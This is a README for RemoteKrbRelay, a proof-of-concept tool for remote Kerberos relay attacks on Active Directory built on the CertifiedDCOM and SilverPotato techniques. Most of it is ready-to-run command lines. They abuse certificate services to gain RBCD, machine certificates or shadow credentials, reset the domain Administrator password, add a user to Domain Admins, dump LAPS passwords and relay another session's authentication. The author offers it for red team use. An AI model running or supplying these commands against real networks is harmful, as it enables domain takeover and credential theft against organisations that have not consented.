# RemoteKrbRelay

You probably know [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), but what if I told you it could be done remotely? With RemoteKrbRelay this becomes a reality.

# TL;DR

Learn more about CertifiedDCOM [here](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519). CertifiedDCOM allows you to trigger an ADCS machine account:
```shell
# CertifiedDCOM (Abuse AD CS by setting RBCD)
  .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$

# CertifiedDCOM (Abuse ADCS to get Machine cert)
   .\RemoteKrbRelay.exe -adcs -template Machine -victim adcs.root.apchi -target dc01.root.apchi -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8

# CertifiedDCOM (Abuse ADCS with ShadowCreds)
  .\RemoteKrbRelay.exe -shadowcred -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred
```

There's also the [SilverPotato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/) exploit. You can use it to abuse sessions. Including a domain administrator session on a third-party host.
```shell
# Change user password
  .\RemoteKrbRelay.exe -chp -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -chpuser Administrator -chppass Lolkekcheb123! -secure

# Add user to group
  .\RemoteKrbRelay.exe -addgroupmember -victim computer.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -group "Domain Admins" -groupuser petka

# Dump LAPS passwords
  .\RemoteKrbRelay.exe -laps -victim mssql.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Send LDAP Whoami request from relayed user
  .\RemoteKrbRelay.exe -ldapwhoami -victim win10.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Trigger authentication from another session
  .\RemoteKrbRelay.exe -ldapwhoami -victim domainadminhost.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -session 1
```

# Details
Now, you have four folders in front of you:
- Checker
- Checkerv2.0
- Exploit
- FindAvailablePort

# TO DO LIST
- [ ] Dump GMSA
- [ ] Relay initial OXID Request authentication
- [ ] Exchange to exchange relay
- [ ] CLSID Bruteforce
- [ ] Relay with supplemental credentials

# Conclusion
The vulnerability is quite serious. Note that this is the minimum POC. You should refine it if you want to use it stably on your Red Team projects. 

# Acknowledgements
- Repos [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), with their help I was able to figure out Kerberos Relay
- [BH Asia 2024 Talk](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519)
- [Silver Potato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)

Thanks for not posting the POC on CertifiedDCOM and SilverPotato, I've been stoked to do them on those articles :D
